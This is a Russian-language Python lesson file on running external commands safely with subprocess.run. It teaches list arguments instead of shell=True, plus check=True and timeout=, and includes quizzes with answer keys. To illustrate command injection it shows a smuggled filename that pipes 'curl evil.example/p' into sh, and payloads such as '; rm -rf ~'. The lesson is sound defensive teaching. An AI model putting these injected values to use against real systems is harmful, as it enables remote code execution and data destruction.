@@ -1,0 +1,229 @@
+---
+concepts:
+- subprocess-run
+- list-args-vs-shell
+- shell-injection
+- check-and-returncode
+- timeout
+deepensInto: []
+estMin: 16
+lang: ru
+lessonType: topic
+level: senior
+order: 3
+prereqs: []
+slug: 03-subprocess-and-shell-safety
+sources:
+- https://docs.python.org/3/library/subprocess.html
+- https://owasp.org/www-community/attacks/Command_Injection
+spiral: []
+status: ready
+summary: 'Запускай внешние команды через subprocess.run со списком аргументов — тогда shell их не парсит и shell-инъекция превращается в безобидную строку-аргумент. Затем ограничивай каждый вызов через check=True и timeout=, чтобы ошибки и зависания всплывали, а не проходили молча.'
+title: 'subprocess и безопасность от shell-инъекций'
+track: python
+unit: 02-scripting-and-io
+---
+
+
+
+import Hook from "~/components/lesson/Hook.astro";
+import Explanation from "~/components/lesson/Explanation.astro";
+import Recap from "~/components/lesson/Recap.astro";
+import Inset from "~/components/lesson/Inset.astro";
+import Crux from "~/components/prose/Crux.astro";
+import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
+import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
+import Quiz from "~/components/pedagogy/Quiz.astro";
+import TradeoffMatrix from "~/components/pedagogy/TradeoffMatrix.astro";
+import FlowDiagram from "~/components/diagram/FlowDiagram.astro";
+
+<Hook>
+Внутренний инструмент превью-картинок работал два года, пока кто-то не загрузил файл с именем `x.png; curl evil.example/p | sh`. Инструмент делал очевидное: дёргал ImageMagick через `subprocess.run(f"convert {filename} out.png", shell=True)`. Имя файла приходило прямо из формы загрузки, поэтому до `/bin/sh` доходило `convert x.png; curl evil.example/p | sh out.png` — две команды, а не одна. Shell запустил `convert`, упёрся в `;`, а затем бодро выполнил `curl … | sh` атакующего на сервере. Ни переполнения буфера, ни хитрой цепочки эксплойта. Просто строка, интерполяция f-строки и shell, который делает ровно то, что велят shell-метасимволы. У того же инцидента было продолжение неделю спустя: битая загрузка заставила `convert` зависнуть навсегда и заняла воркера — потому что никто не выставил `timeout`. Этот урок о двух строчках, которые предотвращают и то, и другое: передавай список и ограничивай вызов.
+</Hook>
+
+<Crux>Передавай команду списком аргументов (shell её не парсит) и ограничивай через check=True и timeout= — это убивает инъекцию и проявляет сбои.</Crux>
+
+<Explanation>
+
+## subprocess.run: современный API и список, обезоруживающий shell
+
+`subprocess.run(...)` — это та единственная точка входа, которая нужна для запуска внешней программы; он заменяет более старые `os.system` и `os.popen`, которые всегда брали только shell-строку и почти не давали контроля над результатом. Самое важное решение при работе с `run` — это как ты передаёшь команду, потому что именно оно определяет, участвует ли shell вообще.
+
+```python
+import subprocess
+
+# SAFE: list of args. Python calls execve("git", ["git","clone",url]) directly.
+# No shell. `url` is one literal argv entry — metacharacters in it mean nothing.
+subprocess.run(["git", "clone", url])
+
+# DANGEROUS: a single string + shell=True. Python hands the whole string to /bin/sh,
+# which PARSES it — so anything in `url` like ; | && $() runs as its own command.
+subprocess.run(f"git clone {url}", shell=True)
+```
+
+В форме со списком `subprocess` запускает программу напрямую через семейство `execve` ОС: программа — это `argv[0]`, а каждый остальной элемент списка передаётся как литеральный аргумент, байт в байт. В цепочке нет никакого `/bin/sh`, так что нечему интерпретировать `;`, `|`, `&&`, `$(…)` или обратные кавычки. Враждебный `url` вида `https://h/r; rm -rf ~` — это просто (бессмысленная, безвредная) строка-аргумент, переданная `git`, который отвергает её как плохой URL. В этом вся защита: **нет shell — нет shell-инъекции.**
+
+<Inset kind="why" lang="ru">
+Почему форма *со списком* предотвращает инъекцию, а форма *строка + `shell=True`* — включает её? Потому что форма со списком целиком обходит shell — Python запускает программу напрямую и передаёт каждый элемент списка как литеральную запись `argv`, так что shell-метасимволы внутри аргумента не имеют особого смысла; это просто байты внутри строки, которую получает программа. `shell=True` же прогоняет твою единственную строку через `/bin/sh`, чья вся работа — *парсить* эту строку: он бьёт по пробелам, раскрывает `$VAR` и `$(…)` и трактует `;`, `|`, `&&` как разделители команд. Поэтому любая подстрока, подконтрольная атакующему, может закрыть задуманную команду и открыть новую. Shell не сломан — он делает ровно то, что shell делает. Фикс — никогда не давать ему шанса: держи аргументы списком и оставь `shell` в дефолтном `False`.
+</Inset>
+
+## shell=True — вектор инъекции, а shlex.quote — утешительный приз
+
+Опасность не в самом `shell=True`, а в `shell=True` *с интерполированным недоверенным вводом*. В момент, когда любая часть этой строки приходит от пользователя, из загрузки, из тела HTTP, из имени файла или другого сервиса, атакующий может протащить через неё shell-метасимволы и вырваться из задуманной команды. Это хрестоматийная OS command injection (OWASP), и для неё не нужно ничего экзотического — `;` или `$(…)` — это весь payload.
+
+```python
+# The vulnerability, in one line. `filename` is from an upload form.
+subprocess.run(f"convert {filename} out.png", shell=True)   # filename = "x.png; <command>"
+
+# The fix is not "quote harder" — it is "don't build a shell string at all":
+subprocess.run(["convert", filename, "out.png"])            # filename is one inert argv entry
+```
+
+Если тебе *по-настоящему* нужна фича shell — пайплайн, glob, раскрытие `~`, которое делает только shell, — тогда и только тогда тянись к `shlex.quote()`, чтобы экранировать каждый недоверенный кусок перед тем, как он войдёт в строку. Но относись к этому как к утешительному призу: `shlex.quote` — в одном забытом вызове от дыры, тогда как форма со списком структурно безопасна и забывать там нечего. Тянись к списку первым, каждый раз; тянись к shell (с `shlex.quote` на каждом недоверенном фрагменте) только когда фича shell действительно требуется.
+
+<FlowDiagram
+  label="Два пути одного и того же недоверенного ввода, доходящего до subprocess.run. Безопасный путь: передача команды списком аргументов заставляет Python вызвать execve напрямую без shell, так что каждый элемент списка доставляется программе как одна литеральная запись argv, и shell-метасимволы в нём инертны — инъекция невозможна. Небезопасный путь: построение единой строки с shell=True отдаёт её /bin/sh, который парсит строку и трактует метасимволы вроде точки с запятой, пайпа и доллар-скобок как разделители команд, так что подконтрольный атакующему ввод запускается как собственная команда — инъекция. Структурная защита внизу: список аргументов плюс check=True плюс timeout= даёт вызов, защищённый от инъекции, падающий громко и не способный зависнуть."
+  hue="var(--d-systems)"
+  perRow={3}
+  nodes={[
+    { id: "input", label: "untrusted input", sub: "filename / url" },
+    { id: "list", label: "list args", sub: "execve, no shell" },
+    { id: "safe", label: "literal argv", sub: "inert → safe" },
+    { id: "shell", label: "shell=True string", sub: "/bin/sh parses" },
+    { id: "inject", label: "metachars run", sub: "injection" },
+    { id: "defense", label: "list + check + timeout", sub: "proof + loud" },
+  ]}
+  edges={[
+    { from: "input", to: "list", label: "as list" },
+    { from: "list", to: "safe", label: "no shell" },
+    { from: "input", to: "shell", label: "as string" },
+    { from: "shell", to: "inject", label: "; | $()" },
+    { from: "safe", to: "defense", label: "harden" },
+  ]}
+  caption="Один ввод, две судьбы. Список аргументов (сверху) доходит до программы как литеральный аргумент и остаётся инертным; строка shell=True (в середине) парсится /bin/sh, и любой метасимвол запускается. Сеньорский дефолт (снизу) — список аргументов плюс check и timeout."
+/>
+
+## Захват вывода и реальная проверка результата
+
+Запустить команду — половина работы; прочитать, что произошло, — вторая половина. `subprocess.run([...], capture_output=True, text=True)` захватывает stdout и stderr ребёнка как декодированные строки (без `text=True` ты получишь сырые `bytes`). Возвращённый `CompletedProcess` несёт `.returncode` — код возврата, где `0` — успех, а любое ненулевое значение — сбой, о котором программа тебе сообщает.
+
+```python
+r = subprocess.run(["git", "clone", url], capture_output=True, text=True)
+if r.returncode != 0:
+    raise RuntimeError(f"clone failed: {r.stderr}")   # don't sail past a non-zero exit
+
+# Or let subprocess raise for you — check=True turns non-zero into an exception:
+subprocess.run(["git", "clone", url], check=True)     # raises CalledProcessError on failure
+```
+
+Подвох тут — это скриптовый аналог непроверенного кода возврата ошибки: по умолчанию `run` **не** бросает исключение на ненулевом выходе, так что упавший шаг выглядит успешным, и твой скрипт марширует дальше. Это тот баг крон-задачи, где ночной бэкап «отрабатывал нормально» месяцами, потому что шаг `pg_dump` выходил с ненулевым кодом, и никто не проверял. Дисциплина безусловна: либо сам инспектируй `.returncode`, либо передавай `check=True`, чтобы упавшая команда бросала `CalledProcessError`, а не проходила молча.
+
+## timeout=: граница, которая не даёт зависшему ребёнку повесить тебя
+
+Внешние команды общаются с сетями, дисками и другими процессами — а всё это может застрять. `subprocess.run([...], timeout=30)` бросает `TimeoutExpired`, если ребёнок не завершился за заданное число секунд. Без него застрявший `git fetch` к мёртвому зеркалу, `curl` к чёрной дыре хоста или `convert`, жующий битый файл, повесят твой скрипт — а в CI повесят весь пайплайн — на неопределённый срок.
+
+```python
+try:
+    subprocess.run(["git", "fetch"], check=True, timeout=30)
+except subprocess.TimeoutExpired:
+    # the child is killed; handle the stall instead of blocking forever
+    log.error("git fetch exceeded 30s — aborting")
+```
+
+Это ровно продолжение инцидента с превью: битая загрузка заставила `convert` крутиться вечно и заняла воркера, и фиксом стало добавление одного слова — `timeout=`. Относись к каждому внешнему вызову как к тому, что может зависнуть, и ограничивай его. Завершают картину два смежных подвоха: чтение большого вывода через сырой `subprocess.PIPE` и затем `.wait()` может **встать в deadlock**, когда буфер pipe ОС заполняется и ни одна сторона его не дренирует, — `run()` (и `Popen.communicate()`) читают pipe за тебя и обходят это; и передавай `env=` явно, когда нужна воспроизводимость или хочешь не утечь секреты родителя в ребёнка, а `cwd=` — чтобы задать рабочую директорию вместо мутации процесса через `chdir`.
+
+<div data-lesson-visual class="overflow-x-auto my-6">
+  <table class="w-full text-sm border-collapse">
+    <thead>
+      <tr class="bg-surface-2">
+        <th class="border border-border px-3 py-2 text-left">Вызов</th>
+        <th class="border border-border px-3 py-2 text-left">Shell?</th>
+        <th class="border border-border px-3 py-2 text-left">Риск инъекции</th>
+        <th class="border border-border px-3 py-2 text-left">Вердикт</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td class="border border-border px-3 py-2"><code>run([prog, arg], ...)</code></td>
+        <td class="border border-border px-3 py-2">Нет (execve напрямую)</td>
+        <td class="border border-border px-3 py-2">Нет — arg литерален</td>
+        <td class="border border-border px-3 py-2"><strong>Дефолт. Используй это.</strong></td>
+      </tr>
+      <tr class="bg-surface-2">
+        <td class="border border-border px-3 py-2"><code>run(f"prog &#123;x&#125;", shell=True)</code></td>
+        <td class="border border-border px-3 py-2">Да — парсит /bin/sh</td>
+        <td class="border border-border px-3 py-2">Полная инъекция, если x недоверен</td>
+        <td class="border border-border px-3 py-2">Избегай с недоверенным вводом</td>
+      </tr>
+      <tr>
+        <td class="border border-border px-3 py-2"><code>os.system(f"prog &#123;x&#125;")</code></td>
+        <td class="border border-border px-3 py-2">Да — всегда shell</td>
+        <td class="border border-border px-3 py-2">Та же инъекция, меньше контроля</td>
+        <td class="border border-border px-3 py-2">Легаси — не тянись к нему</td>
+      </tr>
+      <tr class="bg-surface-2">
+        <td class="border border-border px-3 py-2"><code>run(cmd, shell=True)</code> + <code>shlex.quote</code></td>
+        <td class="border border-border px-3 py-2">Да, но экранировано</td>
+        <td class="border border-border px-3 py-2">Низкий, если каждый кусок quote-нут</td>
+        <td class="border border-border px-3 py-2">Только когда нужна фича shell</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<TradeoffMatrix
+  id="python-02-scripting-and-io-03-subprocess-and-shell-safety-tradeoff-1"
+  lessonSlug="03-subprocess-and-shell-safety"
+  lang="ru"
+  prompt="Нужно запустить `git clone <url>`, где `url` приходит от недоверенного пользователя, безопасно и надёжно. Какой вызов ты отгрузишь?"
+  options={[
+    { name: "subprocess.run(['git', 'clone', url], check=True, timeout=300)", summary: "Список аргументов, без shell, ограничен.", correct: true, justification: "Форма со списком заставляет Python вызвать execve `git` напрямую без shell в цепочке, так что `url` приходит как одна литеральная запись argv — вредоносное значение вроде `; rm -rf ~` это просто плохая URL-строка, которую `git` отвергает, никогда не команда. check=True бросает CalledProcessError, если клон упал, чтобы ошибка не прошла молча, а timeout= убивает клон, зависший на мёртвом remote, вместо вечной блокировки скрипта. Это сеньорский дефолт по всем трём осям: защищён от инъекции, падает громко, не может зависнуть." },
+    { name: "subprocess.run(f'git clone {url}', shell=True)", summary: "Строка в /bin/sh.", justification: "Это и есть уязвимость. F-строка строит одну строку, а shell=True отдаёт её /bin/sh, который её парсит — так что `url`, содержащий `;`, `|` или `$(…)`, вырывается из клона и запускает собственную команду атакующего на твоём хосте. Здесь также нет check и нет timeout, так что даже игнорируя инъекцию, он падает молча и может зависнуть. Это ровно класс багов, который OWASP называет OS command injection." },
+    { name: "os.system(f'git clone {url}')", summary: "Легаси-вызов shell.", justification: "os.system всегда запускает shell, так что он подвержен инъекции идентично shell=True, и даёт даже меньше: ни формы со списком аргументов, ни capture_output, ни timeout, только сырой статус выхода. Это более старый API, на замену которому был построен subprocess.run. Никогда не интерполируй в него недоверенный ввод." },
+    { name: "subprocess.run(f'git clone \"{url}\"', shell=True)", summary: "Кавычки в f-строке.", justification: "Обернуть URL в двойные кавычки внутри f-строки кажется безопаснее, но это не так: payload может просто включить собственную закрывающую кавычку и `;` (`x\"; rm -rf ~ #`), чтобы вырваться, а `$(…)` всё равно раскрывается внутри двойных кавычек. Ручное квотирование — это ровно то, что shlex.quote делает корректно, — и даже оно второсортно по сравнению с тем, чтобы вообще не строить shell-строку. Используй форму со списком." },
+  ]}
+/>
+
+<Quiz
+  id="python-02-scripting-and-io-03-subprocess-and-shell-safety-quiz-1"
+  lessonSlug="03-subprocess-and-shell-safety"
+  lang="ru"
+  question="`url` — это недоверенный пользовательский ввод. Какой вызов subprocess.run защищён от инъекции и почему?"
+  choices={[
+    { label: "subprocess.run(['git', 'clone', url]) — форма со списком запускает git напрямую без shell, так что url это одна литеральная запись argv, и его метасимволы инертны", correct: true },
+    { label: "subprocess.run(f'git clone {url}', shell=True) — shell=True нормально, пока команда начинается с доверенного имени программы", misconception: "shell=True отдаёт всю строку /bin/sh, который парсит её независимо от того, как она начинается. Доверенный ведущий `git` тебя не защищает — `;` или `$(…)` позже в url закрывает команду git и стартует команду атакующего. Ведущее имя программы нерелевантно, как только shell начал парсить." },
+    { label: "Любой из них — Python санитизирует аргументы для subprocess по умолчанию", misconception: "Python ничего не санитизирует. Форма со списком безопасна, потому что целиком обходит shell (никто не парсит аргумент); строка shell=True небезопасна, потому что /bin/sh её парсит. Безопасность идёт от того, участвует ли shell, а не от какой-либо очистки ввода, которую Python выполняет." },
+    { label: "subprocess.run('git clone ' + url) без shell=True — конкатенация строк избегает f-строки", misconception: "Передача единой строки без shell=True не разбивает её на аргументы — subprocess трактует всё 'git clone <url>' как одно имя программы для exec, что падает с FileNotFoundError. Фикс — это список аргументов, а не другой способ построить одну строку." },
+  ]}
+/>
+
+<Quiz
+  id="python-02-scripting-and-io-03-subprocess-and-shell-safety-quiz-2"
+  lessonSlug="03-subprocess-and-shell-safety"
+  lang="ru"
+  question="Помимо избегания shell, почему нужно выставлять check=True (или инспектировать .returncode) и передавать timeout=?"
+  choices={[
+    { label: "По умолчанию run() не бросает исключение на ненулевом выходе, так что упавшая команда проходит молча; а без timeout= зависший ребёнок блокирует скрипт навсегда", correct: true },
+    { label: "check=True заставляет команду работать быстрее, а timeout= уменьшает потребление памяти", misconception: "Ни то, ни другое не влияет на скорость или память. check=True превращает ненулевой выход в CalledProcessError, чтобы сбои всплывали, а не игнорировались; timeout= бросает TimeoutExpired, чтобы застрявший ребёнок был убит, а не повесил тебя. Оба про корректность и живучесть, не про производительность." },
+    { label: "Они нужны только с shell=True; форма со списком уже проверяет код выхода и ограничивает время работы", misconception: "Форма со списком лишь убирает shell — она ничего не меняет в проверке кода выхода или таймаутах. run() со списком всё равно молча возвращается на ненулевом выходе и всё равно ждёт зависшего ребёнка вечно. check=True и timeout= ортогональны тому, как ты передаёшь команду." },
+    { label: "Python автоматически повторяет команду, пока она не преуспеет, так что returncode всегда 0", misconception: "subprocess никогда не ретраит. Он запускает команду один раз; .returncode — это то, с чем вышел ребёнок, и ненулевое значение игнорируется, если ты не проверишь его или не выставишь check=True. Молчаливый ненулевой — это ровно тот сбой крон-скрипта, который это предотвращает." },
+  ]}
+/>
+
+</Explanation>
+
+<KeyTakeaway>Передавай команду списком аргументов — shell её не парсит, и вредоносное имя файла это инертный аргумент, не вторая команда. Оставь shell=False, затем ограничь вызов: check=True для сбоев и timeout= против зависаний.</KeyTakeaway>
+
+<RetrievalDrawer
+  client:load
+  id="python-02-scripting-and-io-03-subprocess-and-shell-safety-retrieval"
+  lang="ru"
+  questions={[
+    { q: "Объясни точно, почему subprocess.run со списком аргументов защищён от инъекции, а форма строка + shell=True — нет, и какая единственная корректная митигация, когда shell всё же нужен.", a: "Со списком аргументов subprocess запускает целевую программу напрямую через семейство execve ОС: первый элемент — это программа, а каждый остальной элемент передаётся как литеральная запись argv, байт в байт. Никакого /bin/sh в цепочке нет, так что нечему интерпретировать shell-метасимволы — `;`, `|`, `&&`, `$(…)`, обратные кавычки внутри аргумента это просто байты в строке, которую получает программа. Враждебное имя файла или url вроде `x; rm -rf ~` — это поэтому один инертный (и вероятно невалидный) аргумент, не вторая команда. Форма строка + shell=True противоположна: Python отдаёт твою единую строку /bin/sh, чья вся работа — парсить её: разбить по пробелам, раскрыть $VAR и $(…), трактовать ; | && как разделители — так что любая подконтрольная атакующему подстрока может закрыть задуманную команду и запустить свою. Это OS command injection (OWASP). Фикс структурный: передай список и оставь shell в дефолтном False. Если и только если тебе по-настоящему нужна фича shell (пайплайн, glob, раскрытие ~), ты обязан прогнать shlex.quote() на каждом недоверенном фрагменте перед тем, как он войдёт в строку — но это утешительный приз: он в одном забытом вызове от дыры, тогда как в форме со списком забывать нечего." },
+    { q: "Помимо победы над инъекцией, какие две границы делают вызов внешней команды надёжным, что каждая предотвращает и какие смежные подвохи с PIPE/env?", a: "Сначала проверь результат: по умолчанию subprocess.run НЕ бросает исключение на ненулевом выходе, так что упавшая команда выглядит успешной, и скрипт продолжается — баг крон-задачи, где ночной шаг выходил с ненулевым кодом месяцами, и никто не заметил. Фикс — либо инспектировать .returncode (0 — успех, ненулевое — сбой), либо передать check=True, чтобы сбой бросал CalledProcessError. Затем ограничь время работы: передай timeout=, чтобы subprocess бросил TimeoutExpired и убил ребёнка, если он не завершился вовремя. Без него ребёнок, который общается с мёртвой сетью или жуёт битый файл (застрявший git fetch, curl в чёрную дыру, зацикленный convert), вешает твой скрипт и, в CI, весь пайплайн навсегда. Смежные подвохи: чтение большого вывода через сырой subprocess.PIPE и затем .wait() может встать в deadlock, когда буфер pipe ОС заполняется и ни одна сторона его не дренирует — run() и Popen.communicate() читают pipe за тебя и избегают этого; передавай env= явно для воспроизводимости и чтобы не утечь секреты родителя в ребёнка; и используй cwd=, чтобы задать рабочую директорию, вместо мутации всего процесса через os.chdir." },
+  ]}
+/>
+
+<Recap lang="ru">
+Безопасный запуск внешних команд сводится к одному структурному выбору и двум границам. Выбор: вызывай subprocess.run с командой в виде СПИСКА аргументов, никогда как строку с shell=True. Форма со списком запускает программу напрямую через execve без shell в цепочке, так что каждый элемент — это литеральная запись argv, и shell-метасимволы в имени файла или url (`;`, `|`, `&&`, `$(…)`) инертны — враждебный ввод это просто (отвергнутый) аргумент, никогда не вторая команда. Форма строка + shell=True вместо этого кормит /bin/sh, который парсит строку, так что любая недоверенная подстрока может вырваться и запустить свою команду — классическая OS command injection (OWASP), ровно тот баг за инструментом превью, который запустил загруженное имя файла `x.png; <command>` как настоящую shell-команду. У os.system тот же изъян при меньшем контроле. Используй shlex.quote на каждом недоверенном фрагменте только когда тебе действительно нужна фича shell; иначе в форме со списком забывать нечего. Затем ограничивай вызов: по умолчанию run не бросает исключение на ненулевом выходе, так что выставляй check=True (или инспектируй .returncode), чтобы сбои не проходили молча, как крон-бэкап, который «отрабатывал нормально», выходя с ненулевым кодом; и передавай timeout=, чтобы зависший ребёнок (git fetch к мёртвому зеркалу, зацикленный convert) бросал TimeoutExpired, а не блокировал скрипт — однословный фикс продолжения инцидента с превью. Завершай это чтением вывода через run/communicate, а не сырой PIPE + wait(), который может встать в deadlock, передачей env= явно, чтобы не утечь секреты, и cwd= вместо os.chdir.
+</Recap>
